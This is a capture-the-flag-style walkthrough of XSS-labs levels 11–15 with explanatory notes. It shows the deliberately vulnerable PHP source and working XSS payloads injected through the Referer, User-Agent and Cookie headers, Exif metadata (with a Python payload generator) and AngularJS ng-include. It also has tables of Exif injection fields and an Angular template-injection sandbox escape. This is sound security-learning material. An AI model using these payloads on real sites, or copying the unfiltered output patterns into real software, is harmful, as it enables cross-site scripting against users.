---
title: "Xss-labs Full Walkthrough & XSS Notes03"
publishDate: 2025-12-26 16:49:00
description: "Analysis and Notes"
tags: ["XSS", "Notes", "Web"]
language: "English"

---

> Notes compiled by a beginner for learning and reference. I am not a professional; please forgive any oversights. Acknowledgments to others and AI assistance where applicable.
> 
> I chose to present the source code directly (normally you cannot see the full backend source, only the page source). On one hand, this saves space used by trial-and-error payloads; on the other hand, it makes it more intuitive for future review without needing to run other tools. I believe most filtering methods can be discovered through testing—just try a few more times. (Okay, actually, I don't think anyone else will read this; it's mostly for my own review)

## Level 11

Source Code Presentation

```php
<!DOCTYPE html><!--STATUS OK--><html>
<head>
<meta http-equiv="content-type" content="text/html;charset=utf-8">
<script>
window.alert = function()  
{     
confirm("完成的不错！");
 window.location.href="level12.php?keyword=good job!"; 
}
</script>
<title>欢迎来到level11</title>
</head>
<body>
<h1 align=center>欢迎来到level11</h1>
<?php 
ini_set("display_errors", 0);
$str = $_GET["keyword"];
$str00 = $_GET["t_sort"];
$str11=$_SERVER['HTTP_REFERER'];
$str22=str_replace(">","",$str11);
$str33=str_replace("<","",$str22);
echo "<h2 align=center>没有找到和".htmlspecialchars($str)."相关的结果.</h2>".'<center>
<form id=search>
<input name="t_link"  value="'.'" type="hidden">
<input name="t_history"  value="'.'" type="hidden">
<input name="t_sort"  value="'.htmlspecialchars($str00).'" type="hidden">
<input name="t_ref"  value="'.$str33.'" type="hidden">
</form>
</center>';
?>
<center><img src=level11.png></center>
<?php 
echo "<h3 align=center>payload的长度:".strlen($str)."</h3>";
?>
</body>
</html>

```

1.Judging from the source code analysis, this level is full of smoke screens (it's really impressive if you can solve this without seeing source code; I certainly couldn't guess it).

```php
<input name="t_link"  value="'.'" type="hidden">
<input name="t_history"  value="'.'" type="hidden">
<input name="t_sort"  value="'.htmlspecialchars($str00).'" type="hidden">
<input name="t_ref"  value="'.$str33.'" type="hidden">
```

No matter what you pass to the four variables given in the problem, it's useless...

2.The entry point of the problem lies in the HTTP request header.

```php
$str11=$_SERVER['HTTP_REFERER'];
```

Following this, we can see simple filtering for `<` and `>`. So we need some auxiliary tools, such as **Hackbar**, **BurpSuite**, etc.

3.For example, use BurpSuite to capture the packet and add directly to the end:

```
Referer: " onclick = alert(1) type="text
```

## Level 12

Source Code Presentation

```php
<!DOCTYPE html><!--STATUS OK--><html>
<head>
<meta http-equiv="content-type" content="text/html;charset=utf-8">
<script>
window.alert = function()  
{     
confirm("完成的不错！");
 window.location.href="level13.php?keyword=good job!"; 
}
</script>
<title>欢迎来到level12</title>
</head>
<body>
<h1 align=center>欢迎来到level12</h1>
<?php 
ini_set("display_errors", 0);
$str = $_GET["keyword"];
$str00 = $_GET["t_sort"];
$str11=$_SERVER['HTTP_USER_AGENT'];
$str22=str_replace(">","",$str11);
$str33=str_replace("<","",$str22);
echo "<h2 align=center>没有找到和".htmlspecialchars($str)."相关的结果.</h2>".'<center>
<form id=search>
<input name="t_link"  value="'.'" type="hidden">
<input name="t_history"  value="'.'" type="hidden">
<input name="t_sort"  value="'.htmlspecialchars($str00).'" type="hidden">
<input name="t_ua"  value="'.$str33.'" type="hidden">
</form>
</center>';
?>
<center><img src=level12.png></center>
<?php 
echo "<h3 align=center>payload的长度:".strlen($str)."</h3>";
?>
</body>
</html>
```

1.Very similar to the previous level, just changed `Referer` to `User-Agent`.

2.Still use BurpSuite to capture packets, find `User-Agent` and construct:

```
User-Agent:" onclick = alert(1) type="text
```

## Level 13

Source Code Presentation

```php
<!DOCTYPE html><!--STATUS OK--><html>
<head>
<meta http-equiv="content-type" content="text/html;charset=utf-8">
<script>
window.alert = function()  
{     
confirm("完成的不错！");
 window.location.href="level14.php"; 
}
</script>
<title>欢迎来到level13</title>
</head>
<body>
<h1 align=center>欢迎来到level13</h1>
<?php 
setcookie("user", "call me maybe?", time()+3600);
ini_set("display_errors", 0);
$str = $_GET["keyword"];
$str00 = $_GET["t_sort"];
$str11=$_COOKIE["user"];
$str22=str_replace(">","",$str11);
$str33=str_replace("<","",$str22);
echo "<h2 align=center>没有找到和".htmlspecialchars($str)."相关的结果.</h2>".'<center>
<form id=search>
<input name="t_link"  value="'.'" type="hidden">
<input name="t_history"  value="'.'" type="hidden">
<input name="t_sort"  value="'.htmlspecialchars($str00).'" type="hidden">
<input name="t_cook"  value="'.$str33.'" type="hidden">
</form>
</center>';
?>
<center><img src=level13.png></center>
<?php 
echo "<h3 align=center>payload的长度:".strlen($str)."</h3>";
?>
</body>
</html>

```

1.No difference from the previous two levels, this time it changed to `cookie`.

2.The source code writes as follows. Even without seeing source code, capturing packets via BP (BurpSuite) reveals clear clues.

```php
setcookie("user", "call me maybe?", time()+3600);
```

```
Cookie: user=call+me+maybe%3F  
```

The problem hints at modifying the user value to achieve injection.

3.The rest is no different from the above levels.

```
Cookie: user=" onclick = alert(1) type="text
```

### HTTP Header Injection

| **Level**    | **Injection Point (HTTP Header)** | **PHP Receiver Code (Vulnerability Source)** | **Filtering Status**                         | **Core Payload (General)**      |
| ------------ | --------------------------------- | -------------------------------------------- | -------------------------------------------- | ------------------------------- |
| **Level 11** | **Referer**                       | `$_SERVER['HTTP_REFERER']`                   | Filters `<` `>` <br> **Does not filter `"`** | `" onclick=alert(1) type="text` |
| **Level 12** | **User-Agent**                    | `$_SERVER['HTTP_USER_AGENT']`                | Filters `<` `>` <br> **Does not filter `"`** | `" onclick=alert(1) type="text` |
| **Level 13** | **Cookie**                        | `$_COOKIE['user']`                           | Filters `<` `>` <br> **Does not filter `"`** | `" onclick=alert(1) type="text` |

## Level 14

Source Code Presentation

```html
<html>
<head>
<meta http-equiv="content-type" content="text/html;charset=utf-8">
<title>欢迎来到level14</title>
</head>
<body>
<h1 align=center>欢迎来到level14</h1>
<center><iframe name="leftframe" marginwidth=10 marginheight=10 src="http://www.exifviewer.org/" frameborder=no width="80%" scrolling="no" height=80%></iframe></center><center>这关成功后不会自动跳转。成功者<a href=/xss/level15.php?src=1.gif>点我进level15</a></center>
</body>
</html>

```

1.XSS Labs Level 14 is often considered "broken" or "impossible to complete".

2.We can modify it locally to run it. Since I am in a docker environment, I directly went in and modified `level14.php`.

```php
<!DOCTYPE html>
<html>
<head>
<meta http-equiv="content-type" content="text/html;charset=utf-8">
<title>欢迎来到level14</title>
</head>
<body>
<h1 align=center>欢迎来到level14</h1>
<center>
    <h3>题目说明：此关卡考查 Exif XSS。</h3>
    <p>原题依赖的外部网站已挂，此处模拟了后端读取 Exif 的逻辑。</p>

    <form action="" method="post" enctype="multipart/form-data">
        <label>选择包含恶意 Exif 信息的图片：</label>
        <input type="file" name="file" />
        <input type="submit" value="上传并分析" />
    </form>
</center>

<?php
// 关闭错误显示，避免干扰
ini_set("display_errors", 0);
// 如果有文件上传
if(isset($_FILES["file"])) {
    // 简单的类型检查
    if ((($_FILES["file"]["type"] == "image/jpeg") || ($_FILES["file"]["type"] == "image/pjpeg"))) {

        $filename = $_FILES["file"]["tmp_name"];

        // 【核心考点还原】
        // 使用 exif_read_data 读取元数据
        // 原题的漏洞在于：读取了 Exif 中的 Model (相机型号) 等字段后，未过滤直接 echo
        $exif = @exif_read_data($filename);

        echo "<center><br><h3>图片分析结果：</h3>";

        if($exif && isset($exif['Model'])) {
            // 漏洞点在这里：直接拼接输出，造成 XSS
            echo "相机型号: " . $exif['Model']; 
        } else {
            echo "未读取到相机型号信息 (Model)，请确保图片带有 Exif 数据。";
        }
        echo "</center>";
    }
}
?>

<center>
    <br><br>
    <div>(成功弹窗后，点击下方链接进入下一关)</div>
    <a href="level15.php">点我进level15</a>
</center>
</body>
</html>
```

For convenience, I didn't write other filters. You can add them if you want. The ultimate method is roughly the same as previous levels.

3.Then we might as well construct a `python` script to implement it.

```python
import piexif
from PIL import Image

# 1. 设置 Payload
# 我们要在网页里执行 alert(1)，所以写入 <script>alert(1)</script>
# 注意：写入的位置是 Exif 中的 "Model" (相机型号) 字段
payload = '<script>alert("Level 14 Cracked")</script>'

# 2. 读取原始图片
img_filename = "a.jpg"  # 随便找张jpg图放在同级目录
output_filename = "hack.jpg"

try:
    img = Image.open(img_filename)

    # 3. 构造 Exif 数据
    # Tag 272 对应 Model 属性
    exif_dict = {"0th": {}, "Exif": {}, "GPS": {}, "1st": {}, "thumbnail": None}
    exif_dict["0th"][piexif.ImageIFD.Model] = payload.encode('utf-8')

    # 4. 生成字节流并保存
    exif_bytes = piexif.dump(exif_dict)
    img.save(output_filename, exif=exif_bytes)
    print(f"[+] 生成成功: {output_filename}")
    print("[+] Payload 已写入相机型号字段")

except Exception as e:
    print(f"[-] 出错了: {e}")
```

### Exif Injection

1. * Core Concepts
     
     * **What is Exif**: "Hidden notes" (metadata) of an image, containing camera model, shooting time, GPS, etc. Stored in the JPG file header.
     
     * **Injection Principle**: Exif is essentially text. Attackers use tools to modify fields like "Camera Model" into **malicious code** (like XSS Payload).
     
     * **Trigger Condition**: Server-side reads image Exif info (e.g., `exif_read_data()`) and displays it on the page or stores it in database **without filtering**.
   
   * Attack Flow
   
   * **Creation**: Use ExifTool or Python script to write Payload into image fields.
   
   * **Upload**: Upload the "poisoned" image to the target website.
   
   * **Execution**:
     
     * **Stored XSS**: Triggered when user/admin views image details page.
     
     * **SQL Injection**: Triggered when backend stores Exif info into database (less common).

| **Injection Field (Tag Name)** | **Meaning**         | **Rating** | **Reason**                                            |
| ------------------------------ | ------------------- | ---------- | ----------------------------------------------------- |
| **Model**                      | Camera Model        | ⭐⭐⭐⭐⭐      | Most commonly read and displayed, Level 14 test point |
| **Make**                       | Camera Manufacturer | ⭐⭐⭐⭐⭐      | Often displayed together with Model                   |
| **ImageDescription**           | Image Description   | ⭐⭐⭐⭐       | Allows longer characters, suitable for long Payloads  |
| **UserComment**                | User Comment        | ⭐⭐⭐⭐       | Specifically for user writing, large capacity         |
| **Artist**                     | Photographer/Author | ⭐⭐⭐        | Some album programs display author name               |
| **Copyright**                  | Copyright Info      | ⭐⭐⭐        | Usually displayed at page bottom                      |

## Level 15

Source Code Presentation

```php
<html ng-app>
<head>
        <meta charset="utf-8">
        <script src="angular.min.js"></script>
<script>
window.alert = function()  
{     
confirm("完成的不错！");
 window.location.href="level16.php?keyword=test"; 
}
</script>
<title>欢迎来到level15</title>
</head>
<h1 align=center>欢迎来到第15关，自己想个办法走出去吧！</h1>
<p align=center><img src=level15.png></p>
<?php 
ini_set("display_errors", 0);
$str = $_GET["src"];
echo '<body><span class="ng-include:'.htmlspecialchars($str).'"></span></body>';
?>

```

1.The core technology of this level is **AngularJS** frontend inclusion vulnerability.

Of course, looking at the page source makes it obvious.

```php
<html ng-app>
<head>
        <meta charset="utf-8">
        <script src="angular.min.js"></script>
<script>
window.alert = function()  
{     
confirm("完成的不错！");
 window.location.href="level16.php?keyword=test"; 
}
</script>
<title>欢迎来到level15</title>
</head>
<h1 align=center>欢迎来到第15关，自己想个办法走出去吧！</h1>
<p align=center><img src=level15.png></p>
<body><span class="ng-include:"></span></body>
```

2.**What is `ng-include`?** This is an AngularJS directive. It acts similarly to PHP's `include`, used to **fetch an external HTML file and display it inside the current tag**. **Original Design Intent**: This level was originally supposed to follow Level 14. The author wanted you to upload an image containing a Payload in Level 14 (e.g., `1.jpg`), then reference it in Level 15 (`?src='1.jpg'`). AngularJS would execute the image as HTML code. But regrettably, Level 14 is broken.

3.However, we can change our approach and start from Level 1. We can construct:

```html
level15.php?src='level1.php?name=<img src=1 onerror=alert(1)>'
```

Why not use `<script>`? Because HTML loaded via `ng-include` in AngularJS generally won't execute direct `<script>` tags unless specially handled, but the `onerror` event of `<img>` tags will definitely trigger.

The reason it works even after passing through `htmlspecialchars()` via `ng-include` is because the browser automatically handles entity encoding `&lt;` restoring it to characters for JS use, or sending it as a URL parameter.

### AngularJS

| **Knowledge Point**     | **Key Directives/Symbols**   | **Function (Normal)**                                                       | **CTF/Security Point (Hacker View)**                                                                                     | **Typical Payload / Scenario**                                                                        |
| ----------------------- | ---------------------------- | --------------------------------------------------------------------------- | ------------------------------------------------------------------------------------------------------------------------ | ----------------------------------------------------------------------------------------------------- |
| **Startup Directive**   | `ng-app`                     | Defines root element of Angular app, tells framework to start parsing here. | If the page hasn't enabled Angular, you can inject this attribute to force it on for subsequent attacks.                 | `<html ng-app>`                                                                                       |
| **File Inclusion**      | `ng-include`                 | Loads external HTML fragments and compiles execution.                       | **Bypass Local Filters**. Hide XSS Payload in another file or URL, utilizing this directive to "borrow a knife to kill". | `<div ng-include="'level1.php?x=payload'"></div>`                                                     |
| **Template Expression** | `{{ }}`                      | Outputs variables or simple calculation results in HTML.                    | **CSTI (Client-Side Template Injection)**. Use special constructions to bypass sandbox and execute arbitrary JS code.    | `{{constructor.constructor('alert(1)')()}}`                                                           |
| **Event Directives**    | `ng-click`<br>`ng-mouseover` | Binds mouse click, hover, etc. events.                                      | Similar to native `onclick`, but belongs to Angular system, sometimes bypasses filters for standard HTML events.         | `<div ng-mouseover="x=1">`                                                                            |
| **Unsafe HTML**         | `ng-bind-html`               | Binds HTML content to element.                                              | If not used with `$sce` (Strict Contextual Escaping), leads to DOM XSS.                                                  | `<div ng-bind-html="user_input">`                                                                     |
| **Filters**             | `\|`                         | `\|` (Pipe)                                                                 | Format data (like case conversion, sorting).                                                                             | Sometimes used to obfuscate Payload, or in old versions utilize `orderBy` filters for sandbox escape. |
| **No-Execute**          | `ng-non-bindable`            | Tells Angular **NOT** to parse content of this element.                     | **Defense Measure**. If you see this, it means your injection in this area will be ineffective.                          | `<span ng-non-bindable>{{1+1}}</span>`                                                                |
